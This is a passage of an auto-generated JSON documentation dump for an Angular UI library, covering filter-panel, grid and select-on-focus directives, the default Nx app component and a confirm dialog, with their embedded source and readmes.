catch ( ex ) {\n      // most likely this fails only for tests after Ivy (Angular 9), as it no longer wraps with a component.\n    }\n  }\n\n  public toggle() {\n    this.expanded = !this.expanded;\n    this.setContentHeight();\n    this.toggled.emit({ isExpanded: this.expanded, contentHeight: this.contentHeight });\n  }\n\n  ngOnInit() {\n    if ( this.expandable ) {\n      if ( this.expanded === undefined ) {\n        this.expanded = true;\n      }\n    } else {\n      this.expanded = false;\n    }\n\n    this.needSeperator();\n  }\n\n  ngAfterViewInit() {\n    this.needSeperator();\n    this.setContentHeight();\n  }\n\n  private setContentHeight() {\n    const element = this.filterForm.nativeElement;\n    if ( element ) {\n      const contentArea = element.parentElement;\n      this.contentHeight = contentArea?.offsetHeight || 0;\n    }\n  }\n\n  public needSeperator() {\n    this.hasSeperator = false;\n    if ( this.contentWrapper && this.contentWrapper2 ) {\n      const el1 = this.contentWrapper.nativeElement;\n      const el2 = this.contentWrapper2.nativeElement;\n      if ( el1.children && el2.children ) {\n        if ( el1.children.length > 0 && el2.children.length > 0 ) {\n          const hasActionButtons = el1.children[ 0 ].children.length > 0;\n          const hasTableButtons = el2.children[ 0 ].children.length > 0;\n\n          this.hasSeperator = hasActionButtons && hasTableButtons;\n          this.cdr.detectChanges();\n        }\n      }\n    }\n\n\n  }\n\n  _clearFilter(key: string, index?: number) {\n    if (index === null) {\n      return;\n    }\n    try {\n      this.host.clearFilter(key, index);\n    } catch {\n      this.clearFilter.emit({ key, index });\n    }\n  }\n}\n\n/**\n * <mat-panel-description> directive.\n *\n * This direction is to be used inside of the MdExpansionPanelHeader component.\n */\n@Directive({\n  // eslint-disable-next-line @angular-eslint/directive-selector\n  selector: 'sto-filter-title'\n})\nexport class StoFilterTitle {\n}\n\n\n@Directive({\n  selector: 'sto-filter-table-actions'\n})\nexport class StoFilterTableActions {\n  @HostBinding('class.sto-filter-table-actions')\n  className = true;\n}\n\n@Directive({\n  selector: 'sto-filter-actions'\n})\nexport class StoFilterActions {\n}\n\n@Component({\n  selector: 'sto-filter-actions-bar',\n  template: `\n      <ng-content></ng-content>\n      <mat-button-toggle class=\"icon\"\n                         *ngIf=\"expandable\"\n                         style=\"box-shadow:none\"\n                         [checked]=\"expanded\"\n                         (change)=\"onChange($event)\"\n                         title=\"Toggle filter panel\"\n                         (click)=\"toggle.emit()\">\n          <mat-icon>filter_list</mat-icon>\n      </mat-button-toggle>\n\n  `\n})\n// eslint-disable-next-line @angular-eslint/component-class-suffix\nexport class StoFilterActionsBar {\n  @HostBinding('class.sto-filter-actions')\n  hasClass = true;\n\n  @Input() set expanded(expanded: boolean) {\n    this._expanded = expanded;\n  }\n\n  get expanded(): boolean {\n    return this._expanded;\n  }\n\n  @Input() expandable: boolean;\n  private _expanded: boolean;\n\n  @Output() toggle = new EventEmitter<void>();\n\n  // eslint-disable-next-line @typescript-eslint/no-unused-vars\n  onChange(event: unknown) {\n    // console.log($event);\n  }\n\n\n}\n\n",
            "selector": "sto-filter-title",
            "providers": [],
            "inputsClass": [],
            "outputsClass": [],
            "hostBindings": [],
            "hostListeners": [],
            "propertiesClass": [],
            "methodsClass": [],
            "readme": "<h3 id=\"sto-filter-panel\">Sto filter panel</h3>\n<p>Filter panel is a togglable panel with a header and a content area, and is an extension of expansion panel from material.\nHas build in content areas for title, table actions and filter actions.\nThe panel has a toggle button that open and closes the content area and emits an event with the height of the content area.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel [expandable]=&quot;true&quot; (toggled)=&quot;toggleService.isToggled.emit($event)&quot;&gt;\n    &lt;sto-filter-title&gt;Integration Logs&lt;/sto-filter-title&gt;\n        &lt;sto-filter-table-actions&gt;\n           &lt;button mat-button&gt;\n           New&lt;mat-icon&gt;arrow_drop_down&lt;/mat-icon&gt;\n           &lt;/button&gt;    \n        &lt;/sto-filter-table-actions&gt;\n           &lt;sto-filter-actions&gt;\n                &lt;button mat-icon-button&gt;\n                  &lt;mat-icon&gt;refresh&lt;/mat-icon&gt;\n               &lt;/button&gt;\n            &lt;/sto-filter-actions&gt;\n        &lt;form class=&quot;sto-form sto-grid sto-grid--6&quot; [formGroup]=&quot;form&quot; &gt;\n             &lt;div class=&quot;sto-grid__column&quot;&gt;\n                   &lt;mat-form-field&gt;\n                     ...\n                    &lt;/mat-form-field&gt;\n             &lt;/div&gt;\n        &lt;/form&gt;\n&lt;/sto-filter-panel&gt;</code></pre></div><p>####Selector / Content projection</p>\n<h5 id=\"sto-filter-title\">sto-filter-title</h5>\n<p>The title. Usually just a string but could be html.</p>\n<h5 id=\"sto-filter-table-actions\">sto-filter-table-actions</h5>\n<p>Buttons and actions on the left side of the separator if both table and filter actions is present.\n(The name is from a time where all actions left of the separator was related to the table).</p>\n<h5 id=\"sto-filter-actions\">sto-filter-actions</h5>\n<p>Buttons and actions on the right side of the separator if both table and filter actions is present.\n(The name is from a time where all actions right of the separator was related to the table).</p>\n<p>####Input</p>\n<h5 id=\"expandable\">expandable</h5>\n<p>If the filter panel should be expandable. Default true.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel [expandable]=&quot;true&quot;&gt;</code></pre></div><h5 id=\"expanded\">expanded</h5>\n<p>If the filter panel should be expanded by default. Default false.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel [expanded]=&quot;true&quot;&gt;</code></pre></div><p>####Output</p>\n<h5 id=\"toggled\">toggled</h5>\n<p>Emits {isExpanded: boolean, contentHeight: number } where\nisExpanded is true if the panel opens and false if not.\nContentHeight is the height of the expanded content. </p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel (toggled)=&quot;onToggle($event)&quot;&gt;</code></pre></div>"
        },
        {
            "name": "StoGridColumnDirective",
            "id": "directive-StoGridColumnDirective-1da8b73f34653bf1105c001fb79038c2",
            "file": "libs/core/src/lib/sto-directives/sto-grid.directive.ts",
            "type": "directive",
            "description": "",
            "sourceCode": "import { AfterViewInit, ContentChildren, Directive, ElementRef, HostBinding, Input, OnDestroy, QueryList } from '@angular/core';\n\ninterface BreakpointConfig {\n  2: number;\n  4: number;\n}\n\nconst getClass = (width: number, small = 400, large = 800) => {\n  let cols = 1;\n  if ( width > small ) {\n    cols += 1;\n  }\n  if ( width > large ) {\n    cols += 2;\n  }\n  return `sto-f-grid--${cols}`;\n};\n\nconst ALL_GRIDS = [ 'sto-f-grid--1', 'sto-f-grid--2', 'sto-f-grid--4', 'sto-f-grid--6' ];\n\n@Directive({ selector: '[stoGridSpacer]' })\nexport class StoGridSpacerDirective {\n  @HostBinding('class.sto-f-grid__col')\n  @HostBinding('class.sto-f-grid__col--spacer')\n  useClass = true;\n}\n\n@Directive({ selector: '[stoGridColumn]' })\nexport class StoGridColumnDirective {\n  @HostBinding('class.sto-f-grid__col')\n  useClass = true;\n  @HostBinding('class.sto-f-grid__col--2')\n  @Input()\n  stoGridColumnDouble: boolean;\n\n}\n\n@Directive({\n  selector: '[stoGrid]',\n  exportAs: 'stoGrid'\n})\nexport class StoGridDirective implements AfterViewInit, OnDestroy {\n  @HostBinding('style.max-width.px')\n  @Input()\n  maxWidth = 1000;\n  @HostBinding('style.min-width.px')\n  @Input()\n  minWidth = 250;\n  @HostBinding('class.sto-f-grid')\n  baseClass = true;\n  @ContentChildren(StoGridColumnDirective, { read: ElementRef })\n  columns: QueryList<ElementRef<HTMLElement>>;\n  @Input()\n  breakpoints: BreakpointConfig;\n\n  private observer: ResizeObserver;\n\n  constructor(\n    private elRef: ElementRef<HTMLElement>,\n  ) {\n  }\n\n  ngAfterViewInit() {\n    const el = this.elRef.nativeElement as HTMLElement;\n    this.observer = new ResizeObserver(entries => {\n      for ( const entry of entries ) {\n        const cr = entry.contentRect;\n        const { width } = cr;\n        const breakpoints = this.breakpoints || { 2: 400, 4: 800 };\n        const gridType = getClass(width, breakpoints[ 2 ], breakpoints[ 4 ]);\n        if ( !el.classList.contains(gridType) ) {\n          el.classList.remove(...ALL_GRIDS);\n          el.classList.add(gridType);\n        }\n      }\n    });\n    this.observer.observe(this.elRef.nativeElement);\n  }\n\n  ngOnDestroy() {\n    if ( this.observer ) {\n      this.observer.disconnect();\n    }\n  }\n\n}\n\n",
            "selector": "[stoGridColumn]",
            "providers": [],
            "inputsClass": [
                {
                    "name": "stoGridColumnDouble",
                    "line": 34,
                    "type": "boolean"
                }
            ],
            "outputsClass": [],
            "hostBindings": [
                {
                    "name": "class.sto-f-grid__col",
                    "defaultValue": "true",
                    "line": 31
                }
            ],
            "hostListeners": [],
            "propertiesClass": [],
            "methodsClass": []
        },
        {
            "name": "StoGridDirective",
            "id": "directive-StoGridDirective-1da8b73f34653bf1105c001fb79038c2",
            "file": "libs/core/src/lib/sto-directives/sto-grid.directive.ts",
            "type": "directive",
            "description": "",
            "sourceCode": "import { AfterViewInit, ContentChildren, Directive, ElementRef, HostBinding, Input, OnDestroy, QueryList } from '@angular/core';\n\ninterface BreakpointConfig {\n  2: number;\n  4: number;\n}\n\nconst getClass = (width: number, small = 400, large = 800) => {\n  let cols = 1;\n  if ( width > small ) {\n    cols += 1;\n  }\n  if ( width > large ) {\n    cols += 2;\n  }\n  return `sto-f-grid--${cols}`;\n};\n\nconst ALL_GRIDS = [ 'sto-f-grid--1', 'sto-f-grid--2', 'sto-f-grid--4', 'sto-f-grid--6' ];\n\n@Directive({ selector: '[stoGridSpacer]' })\nexport class StoGridSpacerDirective {\n  @HostBinding('class.sto-f-grid__col')\n  @HostBinding('class.sto-f-grid__col--spacer')\n  useClass = true;\n}\n\n@Directive({ selector: '[stoGridColumn]' })\nexport class StoGridColumnDirective {\n  @HostBinding('class.sto-f-grid__col')\n  useClass = true;\n  @HostBinding('class.sto-f-grid__col--2')\n  @Input()\n  stoGridColumnDouble: boolean;\n\n}\n\n@Directive({\n  selector: '[stoGrid]',\n  exportAs: 'stoGrid'\n})\nexport class StoGridDirective implements AfterViewInit, OnDestroy {\n  @HostBinding('style.max-width.px')\n  @Input()\n  maxWidth = 1000;\n  @HostBinding('style.min-width.px')\n  @Input()\n  minWidth = 250;\n  @HostBinding('class.sto-f-grid')\n  baseClass = true;\n  @ContentChildren(StoGridColumnDirective, { read: ElementRef })\n  columns: QueryList<ElementRef<HTMLElement>>;\n  @Input()\n  breakpoints: BreakpointConfig;\n\n  private observer: ResizeObserver;\n\n  constructor(\n    private elRef: ElementRef<HTMLElement>,\n  ) {\n  }\n\n  ngAfterViewInit() {\n    const el = this.elRef.nativeElement as HTMLElement;\n    this.observer = new ResizeObserver(entries => {\n      for ( const entry of entries ) {\n        const cr = entry.contentRect;\n        const { width } = cr;\n        const breakpoints = this.breakpoints || { 2: 400, 4: 800 };\n        const gridType = getClass(width, breakpoints[ 2 ], breakpoints[ 4 ]);\n        if ( !el.classList.contains(gridType) ) {\n          el.classList.remove(...ALL_GRIDS);\n          el.classList.add(gridType);\n        }\n      }\n    });\n    this.observer.observe(this.elRef.nativeElement);\n  }\n\n  ngOnDestroy() {\n    if ( this.observer ) {\n      this.observer.disconnect();\n    }\n  }\n\n}\n\n",
            "selector": "[stoGrid]",
            "providers": [],
            "inputsClass": [
                {
                    "name": "breakpoints",
                    "line": 54,
                    "type": "BreakpointConfig"
                },
                {
                    "name": "maxWidth",
                    "defaultValue": "1000",
                    "line": 45
                },
                {
                    "name": "minWidth",
                    "defaultValue": "250",
                    "line": 48
                }
            ],
            "outputsClass": [],
            "hostBindings": [
                {
                    "name": "class.sto-f-grid",
                    "defaultValue": "true",
                    "line": 50
                }
            ],
            "hostListeners": [],
            "propertiesClass": [
                {
                    "name": "columns",
                    "type": "QueryList<ElementRef<HTMLElement>>",
                    "optional": false,
                    "description": "",
                    "line": 52,
                    "decorators": [
                        {
                            "name": "ContentChildren",
                            "stringifiedArguments": "StoGridColumnDirective, {read: ElementRef}"
                        }
                    ]
                },
                {
                    "name": "observer",
                    "type": "ResizeObserver",
                    "optional": false,
                    "description": "",
                    "line": 56,
                    "modifierKind": [
                        112
                    ]
                }
            ],
            "methodsClass": [
                {
                    "name": "ngAfterViewInit",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 63
                },
                {
                    "name": "ngOnDestroy",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 80
                }
            ],
            "implements": [
                "AfterViewInit",
                "OnDestroy"
            ],
            "constructorObj": {
                "name": "constructor",
                "description": "",
                "args": [
                    {
                        "name": "elRef",
                        "type": "ElementRef<HTMLElement>"
                    }
                ],
                "line": 56,
                "jsdoctags": [
                    {
                        "name": "elRef",
                        "type": "ElementRef<HTMLElement>",
                        "tagName": {
                            "text": "param"
                        }
                    }
                ]
            }
        },
        {
            "name": "StoGridSpacerDirective",
            "id": "directive-StoGridSpacerDirective-1da8b73f34653bf1105c001fb79038c2",
            "file": "libs/core/src/lib/sto-directives/sto-grid.directive.ts",
            "type": "directive",
            "description": "",
            "sourceCode": "import { AfterViewInit, ContentChildren, Directive, ElementRef, HostBinding, Input, OnDestroy, QueryList } from '@angular/core';\n\ninterface BreakpointConfig {\n  2: number;\n  4: number;\n}\n\nconst getClass = (width: number, small = 400, large = 800) => {\n  let cols = 1;\n  if ( width > small ) {\n    cols += 1;\n  }\n  if ( width > large ) {\n    cols += 2;\n  }\n  return `sto-f-grid--${cols}`;\n};\n\nconst ALL_GRIDS = [ 'sto-f-grid--1', 'sto-f-grid--2', 'sto-f-grid--4', 'sto-f-grid--6' ];\n\n@Directive({ selector: '[stoGridSpacer]' })\nexport class StoGridSpacerDirective {\n  @HostBinding('class.sto-f-grid__col')\n  @HostBinding('class.sto-f-grid__col--spacer')\n  useClass = true;\n}\n\n@Directive({ selector: '[stoGridColumn]' })\nexport class StoGridColumnDirective {\n  @HostBinding('class.sto-f-grid__col')\n  useClass = true;\n  @HostBinding('class.sto-f-grid__col--2')\n  @Input()\n  stoGridColumnDouble: boolean;\n\n}\n\n@Directive({\n  selector: '[stoGrid]',\n  exportAs: 'stoGrid'\n})\nexport class StoGridDirective implements AfterViewInit, OnDestroy {\n  @HostBinding('style.max-width.px')\n  @Input()\n  maxWidth = 1000;\n  @HostBinding('style.min-width.px')\n  @Input()\n  minWidth = 250;\n  @HostBinding('class.sto-f-grid')\n  baseClass = true;\n  @ContentChildren(StoGridColumnDirective, { read: ElementRef })\n  columns: QueryList<ElementRef<HTMLElement>>;\n  @Input()\n  breakpoints: BreakpointConfig;\n\n  private observer: ResizeObserver;\n\n  constructor(\n    private elRef: ElementRef<HTMLElement>,\n  ) {\n  }\n\n  ngAfterViewInit() {\n    const el = this.elRef.nativeElement as HTMLElement;\n    this.observer = new ResizeObserver(entries => {\n      for ( const entry of entries ) {\n        const cr = entry.contentRect;\n        const { width } = cr;\n        const breakpoints = this.breakpoints || { 2: 400, 4: 800 };\n        const gridType = getClass(width, breakpoints[ 2 ], breakpoints[ 4 ]);\n        if ( !el.classList.contains(gridType) ) {\n          el.classList.remove(...ALL_GRIDS);\n          el.classList.add(gridType);\n        }\n      }\n    });\n    this.observer.observe(this.elRef.nativeElement);\n  }\n\n  ngOnDestroy() {\n    if ( this.observer ) {\n      this.observer.disconnect();\n    }\n  }\n\n}\n\n",
            "selector": "[stoGridSpacer]",
            "providers": [],
            "inputsClass": [],
            "outputsClass": [],
            "hostBindings": [
                {
                    "name": "class.sto-f-grid__col",
                    "defaultValue": "true",
                    "line": 25
                }
            ],
            "hostListeners": [],
            "propertiesClass": [],
            "methodsClass": []
        },
        {
            "name": "StoSelectTextOnFocusDirective",
            "id": "directive-StoSelectTextOnFocusDirective-a44841c1352cb6c8b9e02626dc005f86",
            "file": "libs/core/src/lib/sto-directives/sto-select-text-on-focus.directive.ts",
            "type": "directive",
            "description": "<p>stoSelectTextOnFocus listens for input focus events, and selects the contents of the input\nA user service is established in {@link StoUserPreferenceService} that allows a user to toggle this feature</p>\n",
            "sourceCode": "import { Directive, ElementRef, HostListener, OnDestroy, OnInit, Optional } from '@angular/core';\nimport { Subject } from 'rxjs';\nimport { StoUserPreferenceService } from '../sto-user-preference/sto-user-preference.service';\nimport { takeUntil } from 'rxjs/operators';\n\n/**\n * stoSelectTextOnFocus listens for input focus events, and selects the contents of the input\n * A user service is established in {@link StoUserPreferenceService} that allows a user to toggle this feature\n */\n@Directive({\n  selector: '[stoSelectTextOnFocus]'\n})\nexport class StoSelectTextOnFocusDirective implements OnInit, OnDestroy {\n\n  private destroyed$ = new Subject<boolean>();\n\n  private _hasSelectTextOnFocusEnabled: boolean;\n  private _el: HTMLInputElement;\n\n  constructor(private elementRef: ElementRef, @Optional() private userPreferenceService: StoUserPreferenceService) {\n    this._el = this.elementRef.nativeElement;\n  }\n\n  /**\n   * Listens for focus events on the host (input) element, and focuses if applicable\n   */\n  @HostListener('focus')\n  @HostListener('dblclick')\n  onFocus() {\n    if ( this._hasSelectTextOnFocusEnabled && this._el.readOnly === false ) {\n      this._el.select();\n    }\n\n  }\n\n  /**\n   * Subscribes to changes in {@link StoUserPreferenceService}, and binds the variable accordingly.\n   */\n  ngOnInit() {\n    if ( this.userPreferenceService ) {\n      this.userPreferenceService.hasSelectTextOnFocusEnabled\n        .pipe(\n          takeUntil(this.destroyed$)\n        ).subscribe((hasSelectTextOnFocusEnabled) => {\n        this._hasSelectTextOnFocusEnabled = hasSelectTextOnFocusEnabled;\n      });\n    }\n  }\n\n  ngOnDestroy() {\n    this.destroyed$.next(true);\n    this.destroyed$.complete();\n  }\n\n}\n",
            "selector": "[stoSelectTextOnFocus]",
            "providers": [],
            "inputsClass": [],
            "outputsClass": [],
            "hostBindings": [],
            "hostListeners": [
                {
                    "name": "focus",
                    "args": [],
                    "argsDecorator": [],
                    "description": "<p>Listens for focus events on the host (input) element, and focuses if applicable</p>\n",
                    "line": 29
                }
            ],
            "propertiesClass": [
                {
                    "name": "_el",
                    "type": "HTMLInputElement",
                    "optional": false,
                    "description": "",
                    "line": 18,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "_hasSelectTextOnFocusEnabled",
                    "type": "boolean",
                    "optional": false,
                    "description": "",
                    "line": 17,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "destroyed$",
                    "defaultValue": "new Subject<boolean>()",
                    "type": "",
                    "optional": false,
                    "description": "",
                    "line": 15,
                    "modifierKind": [
                        112
                    ]
                }
            ],
            "methodsClass": [
                {
                    "name": "ngOnDestroy",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 50
                },
                {
                    "name": "ngOnInit",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 39,
                    "description": "<p>Subscribes to changes in {@link StoUserPreferenceService}, and binds the variable accordingly.</p>\n"
                }
            ],
            "implements": [
                "OnInit",
                "OnDestroy"
            ],
            "constructorObj": {
                "name": "constructor",
                "description": "",
                "args": [
                    {
                        "name": "elementRef",
                        "type": "ElementRef"
                    },
                    {
                        "name": "userPreferenceService",
                        "type": "StoUserPreferenceService"
                    }
                ],
                "line": 18,
                "jsdoctags": [
                    {
                        "name": "elementRef",
                        "type": "ElementRef",
                        "tagName": {
                            "text": "param"
                        }
                    },
                    {
                        "name": "userPreferenceService",
                        "type": "StoUserPreferenceService",
                        "tagName": {
                            "text": "param"
                        }
                    }
                ]
            },
            "readme": "<h4 id=\"stoselecttextonfocusdirective\">StoSelectTextOnFocusDirective</h4>\n<p>stoSelectTextOnFocus listens for input focus events, and selects the contents of the input.\nA user service is established in that allows a user to toggle this feature</p>\n<h5 id=\"usage\">Usage</h5>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;input matInput stoSelectTextOnFocus\n    [formControl]=&quot;freeTextControl&quot; placeholder=&quot;Free Text&quot;&gt;</code></pre></div>"
        }
    ],
    "components": [
        {
            "name": "AppComponent",
            "id": "component-AppComponent-bda5a5426c66340dc15ad0e7c0ebd4fb",
            "file": "apps/oilmod-web/src/app/app.component.ts",
            "encapsulation": [],
            "entryComponents": [],
            "inputs": [],
            "outputs": [],
            "providers": [],
            "selector": "oilmod-web-nx-root",
            "styleUrls": [
                "./app.component.scss"
            ],
            "styles": [],
            "templateUrl": [
                "./app.component.html"
            ],
            "viewProviders": [],
            "inputsClass": [],
            "outputsClass": [],
            "propertiesClass": [
                {
                    "name": "title",
                    "defaultValue": "'oilmod-web'",
                    "type": "string",
                    "optional": false,
                    "description": "",
                    "line": 9
                }
            ],
            "methodsClass": [],
            "hostBindings": [],
            "hostListeners": [],
            "description": "",
            "rawdescription": "",
            "type": "component",
            "sourceCode": "import { Component } from '@angular/core';\n\n@Component({\n  selector: 'oilmod-web-nx-root',\n  templateUrl: './app.component.html',\n  styleUrls: ['./app.component.scss'],\n})\nexport class AppComponent {\n  title = 'oilmod-web';\n}\n",
            "assetsDirs": [],
            "styleUrlsData": [
                {
                    "data": "/*\n * Remove template code below\n */\n:host {\n  display: block;\n  font-family: sans-serif;\n  min-width: 300px;\n  max-width: 600px;\n  margin: 50px auto;\n}\n\n.gutter-left {\n  margin-left: 9px;\n}\n\n.col-span-2 {\n  grid-column: span 2;\n}\n\n.flex {\n  display: flex;\n  align-items: center;\n  justify-content: center;\n}\n\nheader {\n  background-color: #143055;\n  color: white;\n  padding: 5px;\n  border-radius: 3px;\n}\n\nmain {\n  padding: 0 36px;\n}\n\np {\n  text-align: center;\n}\n\nh1 {\n  text-align: center;\n  margin-left: 18px;\n  font-size: 24px;\n}\n\nh2 {\n  text-align: center;\n  font-size: 20px;\n  margin: 40px 0 10px 0;\n}\n\n.resources {\n  text-align: center;\n  list-style: none;\n  padding: 0;\n  display: grid;\n  grid-gap: 9px;\n  grid-template-columns: 1fr 1fr;\n}\n\n.resource {\n  color: #0094ba;\n  height: 36px;\n  background-color: rgba(0, 0, 0, 0);\n  border: 1px solid rgba(0, 0, 0, 0.12);\n  border-radius: 4px;\n  padding: 3px 9px;\n  text-decoration: none;\n}\n\n.resource:hover {\n  background-color: rgba(68, 138, 255, 0.04);\n}\n\npre {\n  padding: 9px;\n  border-radius: 4px;\n  background-color: black;\n  color: #eee;\n}\n\ndetails {\n  border-radius: 4px;\n  color: #333;\n  background-color: rgba(0, 0, 0, 0);\n  border: 1px solid rgba(0, 0, 0, 0.12);\n  padding: 3px 9px;\n  margin-bottom: 9px;\n}\n\nsummary {\n  cursor: pointer;\n  outline: none;\n  height: 36px;\n  line-height: 36px;\n}\n\n.github-star-container {\n  margin-top: 12px;\n  line-height: 20px;\n}\n\n.github-star-container a {\n  display: flex;\n  align-items: center;\n  text-decoration: none;\n  color: #333;\n}\n\n.github-star-badge {\n  color: #24292e;\n  display: flex;\n  align-items: center;\n  font-size: 12px;\n  padding: 3px 10px;\n  border: 1px solid rgba(27, 31, 35, 0.2);\n  border-radius: 3px;\n  background-image: linear-gradient(-180deg, #fafbfc, #eff3f6 90%);\n  margin-left: 4px;\n  font-weight: 600;\n}\n\n.github-star-badge:hover {\n  background-image: linear-gradient(-180deg, #f0f3f6, #e6ebf1 90%);\n  border-color: rgba(27, 31, 35, 0.35);\n  background-position: -0.5em;\n}\n.github-star-badge .material-icons {\n  height: 16px;\n  width: 16px;\n  margin-right: 4px;\n}\n",
                    "styleUrl": "./app.component.scss"
                }
            ],
            "stylesData": "",
            "templateData": "<header class=\"flex\">\n  <img\n    alt=\"Nx logo\"\n    width=\"75\"\n    src=\"https://nx.dev/assets/images/nx-logo-white.svg\"\n  />\n  <h1>Welcome to {{ title }}!</h1>\n</header>\n<main>\n  <h2>Resources &amp; Tools</h2>\n  <p>Thank you for using and showing some ♥ for Nx.</p>\n  <div class=\"flex github-star-container\">\n    <a\n      href=\"https://github.com/nrwl/nx\"\n      target=\"_blank\"\n      rel=\"noopener noreferrer\"\n    >\n      If you like Nx, please give it a star:\n      <div class=\"github-star-badge\">\n        <svg\n          class=\"material-icons\"\n          xmlns=\"http://www.w3.org/2000/svg\"\n          width=\"24\"\n          height=\"24\"\n          viewBox=\"0 0 24 24\"\n        >\n          <path d=\"M0 0h24v24H0z\" fill=\"none\" />\n          <path\n            d=\"M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z\"\n          />\n        </svg>\n        Star\n      </div>\n    </a>\n  </div>\n  <p>Here are some links to help you get started.</p>\n  <ul class=\"resources\">\n    <li class=\"col-span-2\">\n      <a class=\"resource flex\" href=\"https://nxplaybook.com/p/nx-workspaces\">\n        Nx video course\n      </a>\n    </li>\n    <li class=\"col-span-2\">\n      <a\n        class=\"resource flex\"\n        href=\"https://nx.dev/latest/angular/getting-started/getting-started\"\n      >\n        Nx video tutorial\n      </a>\n    </li>\n    <li class=\"col-span-2\">\n      <a\n        class=\"resource flex\"\n        href=\"https://nx.dev/latest/angular/tutorial/01-create-application\"\n      >\n        Interactive tutorial\n      </a>\n    </li>\n    <li class=\"col-span-2\">\n      <a class=\"resource flex\" href=\"https://nx.app/\">\n        <svg\n          width=\"36\"\n          height=\"36\"\n          viewBox=\"0 0 120 120\"\n          fill=\"none\"\n          xmlns=\"http://www.w3.org/2000/svg\"\n        >\n          <path\n            d=\"M120 15V30C103.44 30 90 43.44 90 60C90 76.56 76.56 90 60 90C43.44 90 30 103.44 30 120H15C6.72 120 0 113.28 0 105V15C0 6.72 6.72 0 15 0H105C113.28 0 120 6.72 120 15Z\"\n            fill=\"#0E2039\"\n          />\n          <path\n            d=\"M120 30V105C120 113.28 113.28 120 105 120H30C30 103.44 43.44 90 60 90C76.56 90 90 76.56 90 60C90 43.44 103.44 30 120 30Z\"\n            fill=\"white\"\n          />\n        </svg>\n        <span class=\"gutter-left\">Nx Cloud</span>\n      </a>\n    </li>\n  </ul>\n  <h2>Next Steps</h2>\n  <p>Here are some things you can do with Nx.</p>\n  <details open>\n    <summary>Add UI library</summary>\n    <pre>\n# Generate UI lib\nng g @nrwl/angular:lib ui\n\n# Add a component\nng g @nrwl/angular:component xyz --project ui</pre\n    >\n  </details>\n  <details>\n    <summary>View dependency graph</summary>\n    <pre>nx dep-graph</pre>\n  </details>\n  <details>\n    <summary>Run affected commands</summary>\n    <pre>\n# see what's been affected by changes\nng affected:dep-graph\n\n# run tests for current changes\nng affected:test\n\n# run e2e tests for current changes\nng affected:e2e\n</pre\n    >\n  </details>\n</main>\n"
        },
        {
            "name": "ConfirmComponent",
            "id": "component-ConfirmComponent-52baec8c380862fe14d93dea62e1c28a",
            "file": "libs/common/src/lib/sto-confirm-dialog/sto-confirm-dialog.component.ts",
            "encapsulation": [],
            "entryComponents": [],
            "inputs": [],
            "outputs": [],
            "providers": [],
            "selector": "sto-confirm",
            "styleUrls": [
                "sto-confirm-dialog.component.scss"
            ],
            "styles": [],
            "template": "<h3 *ngIf=\"data.title\"\n    mat-dialog-title>{{ data.title }}</h3>\n<div mat-dialog-content>\n  <p>{{ data.message }}</p>\n</div>\n<div mat-dialog-actions>\n  <button #cancel\n          *ngIf=\"data.showCancel\"\n          title=\"Cancel (esc)\"\n          mat-button\n          [mat-dialog-close]=\"false\">Cancel\n  </button>\n  <button #ok\n          color=\"primary\"\n          mat-button\n          [mat-dialog-close]=\"true\">{{ data.confirmText }}</button>\n</div>\n",
            "templateUrl": [],
            "viewProviders": [],
            "inputsClass": [],
            "outputsClass": [],
            "propertiesClass": [
                {
                    "name": "data",
                    "type": "Data",
                    "optional": false,
                    "description": "",
                    "line": 41,
                    "decorators": [
                        {
                            "name": "Inject",
                            "stringifiedArguments": "MAT_DIALOG_DATA"
                        }
                    ],
                    "modifierKind": [
                        114
                    ]
                },
                {
                    "name": "dialogRef",
                    "type": "MatDialogRef<ConfirmComponent>",
                    "optional": false,
                    "description": "",
                    "line": 41,
                    "modifierKind": [
                        114
                    ]
                },
                {
                    "name": "ok",
                    "type": "ElementRef<HTMLButtonElement>",
                    "optional": false,
                    "description": "",
                    "line": 39,
                    "decorators": [
                        {
                            "name": "ViewChild",
                            "stringifiedArguments": "'ok'"
                        }
                    ]
                }
            ],
            "methodsClass": [],
            "hostBindings": [],
            "hostListeners": [],
            "description": "<p>A confirm dialog that emits an observable.</p>\n",
            "rawdescription": "A confirm dialog that emits an observable.",
            "type": "component",
            "sourceCode": "import { Component, ElementRef, Inject, ViewChild } from '@angular/core';\nimport { MAT_DIALOG_DATA, MatDialogRef } from '@angular/material/dialog';\n\ntype Data = {\n  title: string;\n  message: string;\n  showCancel?: boolean;\n  confirmText: string;\n}\n\n/**\n * A confirm dialog that emits an observable.\n */\n@Component({\n  selector: 'sto-confirm',\n  template: `\n    <h3 *ngIf=\"data.title\"\n        mat-dialog-title>{{ data.title }}</h3>\n    <div mat-dialog-content>\n      <p>{{ data.message }}</p>\n    </div>\n    <div mat-dialog-actions>\n      <button #cancel\n              *ngIf=\"data.showCancel\"\n              title=\"Cancel (esc)\"\n              mat-button\n              [mat-dialog-close]=\"false\">Cancel\n      </button>\n      <button #ok\n              color=\"primary\"\n              mat-button\n              [mat-dialog-close]=\"true\">{{ data.confirmText }}</button>\n    </div>\n  `,\n  styleUrls: ['sto-confirm-dialog.component.scss']\n})\nexport class ConfirmComponent {\n  @ViewChild('ok')\n  ok: ElementRef<HTMLButtonElement>;\n\n  constructor(@Inject(MAT_DIALOG_DATA) public data: Data, public dialogRef: MatDialogRef<ConfirmComponent>) {\n  }\n\n}\n",
            "assetsDirs": [],
            "styleUrlsData": [
                {
                    "data": "",
                    "styleUrl": "sto-confirm-dialog.component.scss"
                }
            ],
            "stylesData": "",
            "constructorObj": {
                "name": "constructor",
                "description": "",
                "args": [
                    {
                        "name": "data",
                        "type": "Data"
                    },
                    {
                        "name": "dialogRef",
